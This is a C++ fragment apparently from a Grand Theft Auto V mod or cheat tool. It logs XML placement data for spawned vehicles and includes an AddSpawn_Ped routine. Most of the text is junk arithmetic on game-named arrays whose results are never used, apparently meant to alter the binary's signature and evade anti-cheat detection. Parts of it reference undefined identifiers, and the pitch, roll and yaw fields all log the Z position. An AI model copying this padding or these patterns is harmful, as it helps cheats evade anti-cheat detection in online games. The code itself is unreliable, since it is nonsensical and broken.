			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<EngineHealth>1000</EngineHealth>");
			Extern_Reader::LOG::LogSemHora("<LightsOn>false</LightsOn>");
			Extern_Reader::LOG::LogSemHora("<IsRadioLoud>0</IsRadioLoud>");
			Extern_Reader::LOG::LogSemHora("<LockStatus>1</LockStatus>");
			Extern_Reader::LOG::LogSemHora("<Neons>");
			Extern_Reader::LOG::LogSemHora("<Left>false</Left>");
			Extern_Reader::LOG::LogSemHora("<Right>false</Right>");
			Extern_Reader::LOG::LogSemHora("<Front>false</Front>");
			Extern_Reader::LOG::LogSemHora("<Back>false</Back>");
			Extern_Reader::LOG::LogSemHora("<R>255</R>");
			Extern_Reader::LOG::LogSemHora("<G>0</G>");
			Extern_Reader::LOG::LogSemHora("<B>255</B>");
			Extern_Reader::LOG::LogSemHora("</Neons>");
			Extern_Reader::LOG::LogSemHora("<DoorsOpen>");
			Extern_Reader::LOG::LogSemHora("<BackLeftDoor>false</BackLeftDoor>");
			Extern_Reader::LOG::LogSemHora("<BackRightDoor>false</BackRightDoor>");
			Extern_Reader::LOG::LogSemHora("<FrontLeftDoor>false</FrontLeftDoor>");
			Extern_Reader::LOG::LogSemHora("<FrontRightDoor>false</FrontRightDoor>");
			Extern_Reader::LOG::LogSemHora("<Hood>false</Hood>");
			Extern_Reader::LOG::LogSemHora("<Trunk>false</Trunk>");
			Extern_Reader::LOG::LogSemHora("<Trunk2>false</Trunk2>");
			Extern_Reader::LOG::LogSemHora("</DoorsOpen>");
			Extern_Reader::LOG::LogSemHora("<DoorsBroken>");
			Extern_Reader::LOG::LogSemHora("<BackLeftDoor>false</BackLeftDoor>");
			Extern_Reader::LOG::LogSemHora("<BackRightDoor>false</BackRightDoor>");
			Extern_Reader::LOG::LogSemHora("<FrontLeftDoor>false</FrontLeftDoor>");
			Extern_Reader::LOG::LogSemHora("<FrontRightDoor>false</FrontRightDoor>");
			Extern_Reader::LOG::LogSemHora("<Hood>false</Hood>");
			Extern_Reader::LOG::LogSemHora("<Trunk>false</Trunk>");
			Extern_Reader::LOG::LogSemHora("<Trunk2>false</Trunk2>");
			Extern_Reader::LOG::LogSemHora("</DoorsBroken>");
			Extern_Reader::LOG::LogSemHora("<TyresBursted>");
			Extern_Reader::LOG::LogSemHora("<FrontLeft>false</FrontLeft>");
			Extern_Reader::LOG::LogSemHora("<FrontRight>false</FrontRight>");
			Extern_Reader::LOG::LogSemHora("<_2>false</_2>");
			Extern_Reader::LOG::LogSemHora("<_3>false</_3>");
			Extern_Reader::LOG::LogSemHora("<BackLeft>false</BackLeft>");
			Extern_Reader::LOG::LogSemHora("<BackRight>false</BackRight>");
			Extern_Reader::LOG::LogSemHora("<_6>false</_6>");
			Extern_Reader::LOG::LogSemHora("<_7>false</_7>");
			Extern_Reader::LOG::LogSemHora("<_8>false</_8>");
			Extern_Reader::LOG::LogSemHora("</TyresBursted>");
			Extern_Reader::LOG::LogSemHora("<ModExtras>");
			Extern_Reader::LOG::LogSemHora("<_10>true</_10>");
			Extern_Reader::LOG::LogSemHora("<_12>false</_12>");
			Extern_Reader::LOG::LogSemHora("</ModExtras>");
			Extern_Reader::LOG::LogSemHora("<Mods>");
			Extern_Reader::LOG::LogSemHora("<_0>-1,0</_0>");
			Extern_Reader::LOG::LogSemHora("<_1>-1,0</_1>");
			Extern_Reader::LOG::LogSemHora("<_2>-1,0</_2>");
			Extern_Reader::LOG::LogSemHora("<_3>-1,0</_3>");
			Extern_Reader::LOG::LogSemHora("<_4>-1,0</_4>");
			Extern_Reader::LOG::LogSemHora("<_5>-1,0</_5>");
			Extern_Reader::LOG::LogSemHora("<_6>-1,0</_6>");
			Extern_Reader::LOG::LogSemHora("<_7>-1,0</_7>");
			Extern_Reader::LOG::LogSemHora("<_8>-1,0</_8>");
			Extern_Reader::LOG::LogSemHora("<_9>-1,0</_9>");
			Extern_Reader::LOG::LogSemHora("<_10>-1,0</_10>");
			Extern_Reader::LOG::LogSemHora("<_11>-1,0</_11>");
			Extern_Reader::LOG::LogSemHora("<_12>-1,0</_12>");
			Extern_Reader::LOG::LogSemHora("<_13>-1,0</_13>");
			Extern_Reader::LOG::LogSemHora("<_14>-1,0</_14>");
			Extern_Reader::LOG::LogSemHora("<_15>-1,0</_15>");
			Extern_Reader::LOG::LogSemHora("<_16>-1,0</_16>");
			Extern_Reader::LOG::LogSemHora("<_17>false</_17>");
			Extern_Reader::LOG::LogSemHora("<_18>false</_18>");
			Extern_Reader::LOG::LogSemHora("<_19>false</_19>");
			Extern_Reader::LOG::LogSemHora("<_20>false</_20>");
			Extern_Reader::LOG::LogSemHora("<_21>false</_21>");
			Extern_Reader::LOG::LogSemHora("<_22>false</_22>");
			Extern_Reader::LOG::LogSemHora("<_23>-1,0</_23>");
			Extern_Reader::LOG::LogSemHora("<_24>-1,0</_24>");
			Extern_Reader::LOG::LogSemHora("<_25>-1,0</_25>");
			Extern_Reader::LOG::LogSemHora("<_26>-1,0</_26>");
			Extern_Reader::LOG::LogSemHora("<_27>-1,0</_27>");
			Extern_Reader::LOG::LogSemHora("<_28>-1,0</_28>");
			Extern_Reader::LOG::LogSemHora("<_29>-1,0</_29>");
			Extern_Reader::LOG::LogSemHora("<_30>-1,0</_30>");
			Extern_Reader::LOG::LogSemHora("<_31>-1,0</_31>");
			Extern_Reader::LOG::LogSemHora("<_32>-1,0</_32>");
			Extern_Reader::LOG::LogSemHora("<_33>-1,0</_33>");
			Extern_Reader::LOG::LogSemHora("<_34>-1,0</_34>");
			Extern_Reader::LOG::LogSemHora("<_35>-1,0</_35>");
			Extern_Reader::LOG::LogSemHora("<_36>-1,0</_36>");
			Extern_Reader::LOG::LogSemHora("<_37>-1,0</_37>");
			Extern_Reader::LOG::LogSemHora("<_38>-1,0</_38>");
			Extern_Reader::LOG::LogSemHora("<_39>-1,0</_39>");
			Extern_Reader::LOG::LogSemHora("<_40>-1,0</_40>");
			Extern_Reader::LOG::LogSemHora("<_41>-1,0</_41>");
			Extern_Reader::LOG::LogSemHora("<_42>-1,0</_42>");
			Extern_Reader::LOG::LogSemHora("<_43>-1,0</_43>");
			Extern_Reader::LOG::LogSemHora("<_44>-1,0</_44>");
			Extern_Reader::LOG::LogSemHora("<_45>-1,0</_45>");
			Extern_Reader::LOG::LogSemHora("<_46>-1,0</_46>");
			Extern_Reader::LOG::LogSemHora("<_47>-1,0</_47>");
			Extern_Reader::LOG::LogSemHora("<_48>-1,0</_48>");
			Extern_Reader::LOG::LogSemHora("</Mods>");
			Extern_Reader::LOG::LogSemHora("</VehicleProperties>");
			Extern_Reader::LOG::LogSemHora("<OpacityLevel>255</OpacityLevel>");
			Extern_Reader::LOG::LogSemHora("<LodDistance>16960</LodDistance>");
			Extern_Reader::LOG::LogSemHora("<IsVisible>true</IsVisible>");
			Extern_Reader::LOG::LogSemHora("<MaxHealth>1000</MaxHealth>");
			Extern_Reader::LOG::LogSemHora("<Health>1000</Health>");
			Extern_Reader::LOG::LogSemHora("<HasGravity>true</HasGravity>");
			Extern_Reader::LOG::LogSemHora("<IsOnFire>false</IsOnFire>");
			Extern_Reader::LOG::LogSemHora("<IsInvincible>false</IsInvincible>");
			Extern_Reader::LOG::LogSemHora("<IsBulletProof>false</IsBulletProof>");
			Extern_Reader::LOG::LogSemHora("<IsCollisionProof>false</IsCollisionProof>");
			Extern_Reader::LOG::LogSemHora("<IsExplosionProof>false</IsExplosionProof>");
			Extern_Reader::LOG::LogSemHora("<IsFireProof>false</IsFireProof>");
			Extern_Reader::LOG::LogSemHora("<IsMeleeProof>false</IsMeleeProof>");
			Extern_Reader::LOG::LogSemHora("<IsOnlyDamagedByPlayer>false</IsOnlyDamagedByPlayer>");
			Extern_Reader::LOG::LogSemHora("<PositionRotation>");
			Extern_Reader::LOG::LogSemHora("<X>" + to_string(Estrutura.PosX) + "</X>");
			Extern_Reader::LOG::LogSemHora("<Y>" + to_string(Estrutura.PosY) + "</Y>");
			Extern_Reader::LOG::LogSemHora("<Z>" + to_string(Estrutura.PosZ) + "</Z>");
			Extern_Reader::LOG::LogSemHora("<Pitch>" + to_string(Estrutura.PosZ) + "</Pitch>");
			Extern_Reader::LOG::LogSemHora("<Roll>" + to_string(Estrutura.PosZ) + "</Roll>");
			Extern_Reader::LOG::LogSemHora("<Yaw>" + to_string(Estrutura.PosZ) + "</Yaw>");
			Extern_Reader::LOG::LogSemHora("</PositionRotation>");
			Extern_Reader::LOG::LogSemHora("<Attachment isAttached=\"false\" />");
			Extern_Reader::LOG::LogSemHora("</Placement>");
		}
		void AddSpawn_Ped(GTA::Spawn_Struct Estrutura)
		{

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
